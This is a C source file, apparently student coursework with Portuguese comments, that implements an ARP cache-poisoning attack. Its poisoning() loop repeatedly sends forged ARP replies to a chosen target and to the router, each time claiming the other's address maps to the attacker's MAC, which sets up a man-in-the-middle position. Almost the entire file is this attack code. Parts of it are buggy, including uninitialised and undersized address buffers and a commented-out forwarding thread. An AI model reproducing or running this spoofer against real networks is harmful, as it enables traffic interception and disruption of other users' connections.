#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <stdint.h>
#include <inttypes.h>

#define MAC_ADDR_LEN 6
#define BUFFER_SIZE 1600
#define MAX_DATA_SIZE 1500
#define ARP_HDRLEN 28
#define IF_DEBUG 0

#define INT_TO_ADDR(_addr) \
(_addr & 0xFF), \
(_addr >> 8 & 0xFF), \
(_addr >> 16 & 0xFF), \
(_addr >> 24 & 0xFF)

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

char ifname[IFNAMSIZ];
char target_ip[15];
char target_mac[17];
char target_mac_router[17];


int potencia(int base, int expoente){
	/* Inicializacoes */
  int potencia = 1;
  int contador = 0;
  
  /* Calculo da potencia */
  while (contador != expoente) {
    potencia = potencia * base;
    contador = contador + 1;
  }

  return potencia;
}


int getrangeip(char *ifname){

	int mask,fd,i;
	struct ifreq ifr;
	int output[32];
	int pos = 3;
	int range = 0;

 	fd = socket(AF_INET, SOCK_DGRAM, 0);

	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;

	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);

 	ioctl(fd, SIOCGIFNETMASK, &ifr);
    
	mask = ((struct sockaddr_in *)(&ifr.ifr_netmask))->sin_addr.s_addr;

	close(fd);

    unsigned char bytes[4];
    bytes[0] = mask & 0xFF;
    bytes[1] = (mask >> 8) & 0xFF;
    bytes[2] = (mask >> 16) & 0xFF;
    bytes[3] = (mask >> 24) & 0xFF; 

	if(IF_DEBUG){
		printf("marcara em decimal:\n");
    	printf("%d.%d.%d.%d\n", bytes[0], bytes[1], bytes[2], bytes[3]);        
	}

	if(IF_DEBUG){
    	printf("mascara invertida em binario: \n");
    }

	//Já estou invertendo os bits para facilitar
	while(pos > -1){

		//percorre os bits
		for (i = 0; i < CHAR_BIT; ++i) {
	  		//salva em um array de interiros
	  		output[i] = (bytes[pos] >> i) & 1;
	
			if(IF_DEBUG){
    			printf("%d",output[i]);
			}

			if(output[i] == 0){
				range++;
			}
		}

		pos--;
	}

	if(IF_DEBUG){
    	printf("\n");
		printf("sub-rede: %d \n",potencia(2,range));
		printf("total hosts: %d \n",range);
    }

	range = potencia(2,range) - 2;
	
	return range;
}

int getip(char *ifname, char *sender_ip){
	
	int fd, ip;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;

	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	ip = ((struct sockaddr_in *)(&ifr.ifr_addr))->sin_addr.s_addr;

	sprintf(sender_ip, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	return ip;
}

int setArpTable(char *ip, char *mac){
	FILE *pFile;
	pFile = fopen("arp_table.txt", "r+");
	int found = 0;
	char line[256];    

	if (pFile) {
		while (fgets(line, sizeof(line), pFile)) {

			char * str;
			char line_ip[15];
			char line_mac[17];
			str = strtok (line,"\t");
			strcpy(line_ip, str);
			str = strtok (NULL, "\t");
			strcpy(line_mac, str);

			if(strcmp(line_ip, ip) == 0){     
				printf("IP conflict\n");
				found = 1;
			}		
		}

		if(found == 0)		{
			memset(line, 0, sizeof(line));
			sprintf(line, "%s\t%s\n", ip, mac);
			fprintf(pFile, "%s", line);
		}

		fclose(pFile);
	}else{
		fclose(pFile);
	}

	return 0;
}

void getmactarget(char *ip,int find_router){

	FILE *pFile;
	pFile = fopen("arp_table.txt", "r");
	char line[256];    
	char line_ip[15];
	char line_mac[17];
	
	if (pFile) {

		while (fgets(line, sizeof(line), pFile)) {

			char * str;
			str = strtok (line,"\t");
			strcpy(line_ip, str);
			str = strtok (NULL, "\t");
			strcpy(line_mac, str);

			if(strcmp(line_ip, ip) == 0){ 
				if(find_router == 1){
					strcpy(target_mac_router,line_mac);	
				}else{
					strcpy(target_mac,line_mac);				
				}    
				break;
			}		
		}

		fclose(pFile);
	}else{
		fclose(pFile);
	}

	if(IF_DEBUG){
		printf("MAC ALVO %s", target_mac);	
	}
	
}

int getMac(char * ip, uint8_t * mac){
	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	short int ethertype = htons(0x0806);

	arp_hdr arphdr;

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}


	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

	/* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;

	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;

	/* Endereco MAC de destino */
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */	
	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);

	/* Monta o cabecalho ARP */

	/* Hardware type (16 bits): 1 for ethernet */
	arphdr.htype = htons (1);

	/* Protocol type (16 bits): 2048 for IP */
	arphdr.ptype = htons (ETH_P_IP);

	/* Hardware address length (8 bits): 6 bytes for MAC address */
	arphdr.hlen = 6;

	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
	arphdr.plen = 4;

	/* OpCode: 1 for ARP request */
	arphdr.opcode = htons (1);

	/* Sender hardware address (48 bits): MAC address */
	
	// if(if_mac.ifr_hwaddr.sa_data[3] > 0xffffff00){
	// 	printf("tretta mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00);
	// 	if_mac.ifr_hwaddr.sa_data[3] = if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00;
	// }
	// printf("now mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3]);

	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	/* Target hardware address (48 bits): zero, since we don't know it yet. */
	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
	
	// help vars for multiple sends
	char sender_ip[15];
	char target_ip[15];


	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);


	inet_pton (AF_INET, ip, &arphdr.target_ip);

	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
	frame_len += ARP_HDRLEN;

	// Envia pacote 
	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}

	if(IF_DEBUG){
		printf("Broadcast\tARP\tWho has %s? Tell %s\n", target_ip, sender_ip);
	}

	printf("IP AQUI %s, MAC %s",ip, mac);

		unsigned char mac_dst[6];
		unsigned char mac_src[6];
		//unsigned char *arp;
		short int e_type;
		unsigned char ip_sd[4];
        short op_code;
		char sender_mac[17];

		int received = 0;



		while(recv(fd,(char *) &buffer, BUFFER_SIZE, 0) > 0 && received == 0){

			/* Copia o conteudo do cabecalho Ethernet */
			memcpy(mac_dst, buffer, sizeof(mac_dst));
			memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
			memcpy(&e_type, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(e_type));
			e_type = ntohs(e_type);
			
			memcpy(ip_sd, buffer+sizeof(mac_dst)+sizeof(mac_src)+(16*sizeof(char)), sizeof(ip_sd));
    	    memcpy(&op_code, buffer+sizeof(mac_dst)+sizeof(mac_src)+(8*sizeof(char)), sizeof(op_code));

			op_code = ntohs(op_code);
			//if (htons(e_type) == ethertype && op_code == 2) {
    	     //Retirei o opcode para podermos pegar o IP e endereco MAC do roteador
    	     if (htons(e_type) == ethertype) {


    	        //printf("opcode:%d\n", op_code);
				//printf("MAC destino: %02x:%02x:%02x:%02x:%02x:%02x\n", 
    	        //            mac_dst[0], mac_dst[1], mac_dst[2], mac_dst[3], mac_dst[4], mac_dst[5]);

				memset(sender_mac, 0, sizeof(sender_mac));
				sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
				//printf("MAC origem:  %s\n", sender_mac);

				//printf("EtherType: 0x%04x\n", e_type);
				
				memset(sender_ip, 0, sizeof(sender_ip));
				sprintf(sender_ip, "%d.%d.%d.%d", ip_sd[0], ip_sd[1], ip_sd[2], ip_sd[3]);
				

				if(strcmp(sender_ip,ip) == 0){
		
					printf("IP sender: %s\n", sender_ip);
					printf("MAC sender: %s\n", sender_mac);

					//memcpy(mac, sizeof(char), "%02x:%02x:%02x:%02x:%02x:%02x",  mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
					memcpy(&mac, mac_src, sizeof(mac_src));
					received = 1;
					break;
				}
		
			}
		}

	close(fd);

	return 0;
}



void sendarprouter(){

	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	short int ethertype = htons(0x0806);


	arp_hdr arphdr_router;

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}


	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}


	/* =================== INFORMAR O IP DO ROUTER ============*/
	//IP original
	char sender_ip[15];
	//Auxiliar para fatear o ip
	unsigned char sender_byte[4];
	//Auxiliar para shiftar o ip
	int s_ip = 0;
	//Pegar meu ip
	s_ip = getip(ifname, sender_ip);
	//Meu Ip fateado
    sender_byte[0] = s_ip & 0xFF;
    sender_byte[1] = (s_ip >> 8) & 0xFF;
    sender_byte[2] = (s_ip >> 16) & 0xFF;
    //SIMULA SER O ROTEADOR
	sender_byte[3] = 1;
	// set host number
	memset(sender_ip, 0, sizeof(sender_ip));
	sprintf(sender_ip, "%d.%d.%d.%d", sender_byte[0],sender_byte[1],sender_byte[2],sender_byte[3]);

	//MEXI AQUI busca o endereco mac do alvo no arquivo txt
	getmactarget(sender_ip,1);


	/*=========== PREPARE SOCKADDR_LL =============*/
 	/* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;
	/* Endereco MAC de destino */
	memcpy(socket_address.sll_addr, target_mac_router, MAC_ADDR_LEN);
	

	/*============== MONTA CABECALHO ARP =========*/
	/* Hardware type (16 bits): 1 for ethernet */
	arphdr_router.htype = htons (1);
	/* Protocol type (16 bits): 2048 for IP */
	arphdr_router.ptype = htons (ETH_P_IP);
	/* Hardware address length (8 bits): 6 bytes for MAC address */
	arphdr_router.hlen = 6;
	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
	arphdr_router.plen = 4;
	/* OpCode: 2 for ARP  replay */
	arphdr_router.opcode = htons (2);
	//informa hardware address de origem
	memcpy (&arphdr_router.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	
	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO 
	   Target hardware address destino  */

	printf("sfsdff %s  \n",sender_ip);
	getMac(sender_ip,arphdr_router.target_mac);



	//memset (&arphdr_router.target_mac, target_mac, 6 * sizeof (uint8_t));
/*
	uint8_t data[70];    
	char str[70];
	sprintf(str,"U,DHT;T,%d;H,%d;I,%d", (int)(ft * 100), (int)(fh * 100), (int)(fi * 100));
	strcpy(data,(uint8_t*)str);
*/
	

	/*==== AQUI ESTA O TOQUE ME VOI ===*/
	//salva o ip do TARGET como se ele tivesse enviado
	inet_pton (AF_INET, target_ip, &arphdr_router.sender_ip);
	
	//inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
	//Informa o ip alvo que recebe o pacote, neste caso o ROUTER
	inet_pton (AF_INET, sender_ip, &arphdr_router.target_ip);


	/*============= PREENCHE BUFFER ==============*/
	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);
	/* Preenche o campo de endereco MAC de destino  - NAO TEMOS O ENDERECO MAC DO ROTEADOR*/	
	memcpy(buffer, target_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);
	/* Preenche o buffer com os dados do arp */
	memcpy (buffer + frame_len, &arphdr_router, ARP_HDRLEN * sizeof (uint8_t));
	frame_len += ARP_HDRLEN;


	// Envia pacote 
	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}

	if(IF_DEBUG){
			printf("***********ROUTER********** \n");
			printf("IP_SIMULADO: %s\t MAC_ORIGEM: %02x:%02x:%02x:%02x:%02x:%02x\n",target_ip, 
						target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
			printf("\n\n");
	}

	close(fd);
}


void sendarptarget(){

	printf("1112 \n");

	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	//MEXI AQUI char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	short int ethertype = htons(0x0806);

	//MEXI AQUI busca o mac do alvo no arquivo txt
	getmactarget(target_ip,0);

	arp_hdr arphdr;

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}


	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

	printf("1113 \n");
	/* =================== INFORMAR O IP QUE SERA SIMULADO ============*/
	//IP original
	char sender_ip[15];
	//Auxiliar para fatear o ip
	unsigned char sender_byte[4];
	//Auxiliar para shiftar o ip
	int s_ip = 0;
	//Pegar meu ip
	s_ip = getip(ifname, sender_ip);
	//Meu Ip fateado
    sender_byte[0] = s_ip & 0xFF;
    sender_byte[1] = (s_ip >> 8) & 0xFF;
    sender_byte[2] = (s_ip >> 16) & 0xFF;
    //SIMULA SER O ROTEADOR
	sender_byte[3] = 1;
	// set host number
	memset(sender_ip, 0, sizeof(sender_ip));
	sprintf(sender_ip, "%d.%d.%d.%d", sender_byte[0],sender_byte[1],sender_byte[2],sender_byte[3]);


	/*=========== PREPARE SOCKADDR_LL =============*/
   /* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;
	/* Endereco MAC de destino */
	//MEXI AQUI memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
	memcpy(socket_address.sll_addr, target_mac, MAC_ADDR_LEN);
	

	/*============== MONTA CABECALHO ARP =========*/
	/* Hardware type (16 bits): 1 for ethernet */
	arphdr.htype = htons (1);
	/* Protocol type (16 bits): 2048 for IP */
	arphdr.ptype = htons (ETH_P_IP);
	/* Hardware address length (8 bits): 6 bytes for MAC address */
	arphdr.hlen = 6;
	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
	arphdr.plen = 4;
	/* OpCode: 2 for ARP  replay */
	arphdr.opcode = htons (2);
	//informa hardware address de origem
	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	
	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO  - Target hardware address destino  */	
	//memset (&arphdr.target_mac, target_mac, sizeof (target_mac));
	
	getMac(sender_ip, arphdr.target_mac);

	//memcpy (&arphdr.target_mac, target_mac, sizeof (target_mac));	
	
	//salva o ip do roteador como se ele tivesse enviado
	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
	//inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
	//Informa o ip alvo que recebe o pacote
	inet_pton (AF_INET, target_ip, &arphdr.target_ip);


	/*============= PREENCHE BUFFER ==============*/
	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);
	/* Preenche o campo de endereco MAC de destino */	
	memcpy(buffer, target_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);
	/* Preenche o buffer com os dados do arp */
	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
	frame_len += ARP_HDRLEN;

	printf("1114\n");
	// Envia pacote 
	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}


	if(IF_DEBUG){
			printf("***********TARGET********** \n");
			printf("IP_ALVO: %s\t MAC_ORIGEM: %02x:%02x:%02x:%02x:%02x:%02x\n",target_ip, 
						target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
			printf("\n\n");
	}

	close(fd);
}


void  poisoning(){

	while(1){
		printf("01 \n");
		//Envia meu endereco mac para o target informando que sou o router
		sendarptarget();

		sleep(2);

		printf("02 \n");
		//Envia para o router meu endereco mac informando que sou o target
		sendarprouter();		
	
	}
			printf("03\n");
    //pthread_exit(NULL);
}


int main(int argc, char *argv[])
{
    if (argc != 3) {
		printf("Usage: %s iface target_ip\n", argv[0]);
		return 1;
	}
	strcpy(ifname, argv[1]);
	strcpy(target_ip, argv[2]);

    //pthread_t thread_redirect;
    //pthread_t thread_poisoning;
    poisoning();
/*
    if (pthread_create(&thread_redirect, NULL, redirect, NULL) != 0) {
	    printf("Erro ao criar a thread.\n");
	    exit(-1);
    }
*/
	//if (pthread_create(&thread_poisoning, NULL, poisoning, NULL) != 0) {
		printf("Erro ao criar a thread.\n");
		exit(-1);
	//}
   // pthread_exit(NULL);
}


